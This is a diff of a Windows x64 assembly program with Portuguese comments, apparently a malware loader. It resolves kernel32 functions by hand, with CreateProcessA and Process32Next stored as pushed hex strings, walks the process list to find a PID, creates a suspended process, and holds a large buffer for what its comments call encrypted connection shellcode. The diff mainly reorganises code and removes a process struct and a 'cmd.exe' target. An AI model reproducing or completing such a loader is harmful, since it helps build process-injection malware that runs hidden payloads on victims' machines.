@@ -1,36 +1,7 @@
 [BITS 64]
-
 global WinMain
 
-section .data
-
-	struc PROCESSENTRY32W
-		.dwSize  				resd 1
-		.cntUsage 				resd 1
-		.th32ProcessID			resd 1
-		.th32DefaultHeapID 		resd 1
-		.th32ModuleID			resd 1
-		.cntThreads				resd 1
-		.th32ParentProcessID 	resd 1
-		.pcPriClassBase			resd 1
-		.dwFlags				resd 1
-		.szExeFile				resd 1
-	endstruc
-	
-	PROC32 istruc PROCESSENTRY32W
-		at PROCESSENTRY32W.dwSize,  				dw 0
-		at PROCESSENTRY32W.cntUsage, 				dw 0
-		at PROCESSENTRY32W.th32ProcessID,			dw 0
-		at PROCESSENTRY32W.th32DefaultHeapID, 		dw 0
-		at PROCESSENTRY32W.th32ModuleID,			dw 0
-		at PROCESSENTRY32W.cntThreads,				dw 0
-		at PROCESSENTRY32W.th32ParentProcessID, 	dw 0
-		at PROCESSENTRY32W.pcPriClassBase,			dw 0
-		at PROCESSENTRY32W.dwFlags,					dw 0
-		at PROCESSENTRY32W.szExeFile,				db 0
-	iend
-	
-	
+section .data	
     struc theProcess
         .cb resd 1
         .lpReserved resb 8
@@ -73,19 +44,18 @@ section .data
        at theProcess.hStdError, dd 0
     iend
 
-        TamArqProgram times 8 dq 0
-        TamArqTarget times 8 dq 0
-        bufferFileName times 32 db 0
-        Buffer times 800000 db 0
-        addressAlocado times 8 dq 0
-        addressAlocadoEx times 8 dq 0
-        handle times 8 dq 0
-        entrypointTarget times 8 dq 0
+    TamArqProgram times 8 dq 0
+    TamArqTarget times 8 dq 0
+    bufferFileName times 32 db 0
+    Buffer times 800000 db 0
+    addressAlocado times 8 dq 0
+    addressAlocadoEx times 8 dq 0
+    handle times 8 dq 0
+    entrypointTarget times 8 dq 0
 
-		space dd 0
-		process_name db "cmd.exe",0,0
-		process_id db 0
-
+	space dd 0
+	process_id db 0
+	
 section .codered
 	CodeRed:
 	Buffer2 times 800000 db 0
@@ -94,10 +64,13 @@ section .deccode
 	decCode:
 	;SHELLCODE DE CONEXÃO ENCRIPTADO
 	
-	;CRIA PROCESSO PARA OUTRO programa
-	call Locate_kernel32
 	;GetProcddress no registrador R14
+	call Locate_kernel32
 	
+	
+	;CRIA PROCESSO PARA OUTRO programa suspenso
+	
+	;Lookup CreateProcessA
 	mov rax, 0x41737365636f
 	push rax
 	mov rax, 0x7250657461657243
@@ -139,8 +112,8 @@ section .deccode
 	call r12
 	 
 	mov rdi,rsp
+	
 	;GetPID
-	 
 	call Locate_kernel32
 	;lookup CreateToolhelp32Snapshot
 	xor rax,rax
@@ -175,6 +148,7 @@ section .deccode
 	mov r13, rbx 
 	call Locate_kernel32
 	mov rbx,r13
+	
 	;lookup Process32Next
 	mov rax, "2Next"
 	push rax
@@ -246,16 +220,13 @@ ProcessNext2:
 					mov rcx,rax
 					call r13
 
-FimGetPid2:
+	FimGetPid2:
 		mov rbp,rax
 		add rsp, 0x160
-		add rsp, 0x10 
-	 	 
+		add rsp, 0x10 	 	 
 ret
 
 section .text
-
-
 WinMain:
     Start:
         ;***************
@@ -318,11 +289,16 @@ WinMain:
 			call decCode
 	ret
 	
-    ;***************
+	;***************
     ;*     AND     *
     ;***************
 		
-		
+	
+
+	;********************************
+	;* A BAIXO SÃO FUNÇÕES PARA USO *
+	;********************************
+	
     ; Percorra a tabela de endereços de exportação para encontrar o nome GetProcAddress
     FinFunctionGetProcAddress:
 			mov rcx, r10; # Set loop counter
